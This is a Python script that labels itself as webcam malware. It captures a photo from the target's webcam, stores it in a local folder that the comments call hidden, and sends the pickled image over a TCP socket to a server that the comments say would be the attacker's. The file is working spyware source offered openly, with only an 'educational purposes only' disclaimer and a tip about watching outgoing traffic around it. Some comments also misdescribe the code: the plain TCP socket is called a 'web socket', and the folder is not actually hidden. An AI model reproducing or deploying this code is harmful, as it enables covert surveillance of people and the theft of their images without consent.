# Created July 9, 2023 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据
# Run on Windows [ python3 <path to file>\Secret_Python_Webcam_Malware.py ]
# A hidden directory is created on the target's machine, and a (or multiple) photo(s) is/are taken with the webcam
# The images are stored in the hidden directory, then a Python Web Socket is used to send the photos to a remote server
# ALWAYS monitor for outgoing traffic from your system to ensure nothing is being sent from your device without your knowledge

# They would replace 'localhost' and 5000 with the actual attaker's server's IP address and the correct port number.

# Necessary Python Imports
import cv2
import socket
import pickle
import struct
import os

# This script assumes that you have OpenCV installed in your Python environment.
# If not, you can install it using pip: pip install opencv-python

# Functio to capture a photo from the webcam
def capture_photo():
    cam = cv2.VideoCapture(0)  # Single frame from the webcam captured
    ret, frame = cam.read()
    cam.release()
    return frame

# Function to send the photo over a network connection from the target
def send_photo(frame, host='localhost', port=5000):  # This port and IP address would be changed to the attacker's
    client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # Use a Python Web Socket for the data transfer
    client_socket.connect((host, port))

    data = pickle.dumps(frame)
    message_size = struct.pack("L", len(data))  # Packs the photo taken into a smaller message

    client_socket.sendall(message_size + data)  # Sends all photos taken
    
    client_socket.close()  # Closes connection to the attacker's server

# The following function executes a system-level command to create a hidden directory 
# to store the images the webcam takes
def create_directory(dir_name):
    if not os.path.exists(dir_name):
        os.makedirs(dir_name)

# Creates the directory to store the captured photo
create_directory('captured_photos')

# Takes the photo from the webcam
photo = capture_photo()

# Saves the captured image to the hidden directory
cv2.imwrite('captured_photos/photo.jpg', photo)

# Now the photo is sent to the attacker's server
send_photo(photo)

# DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
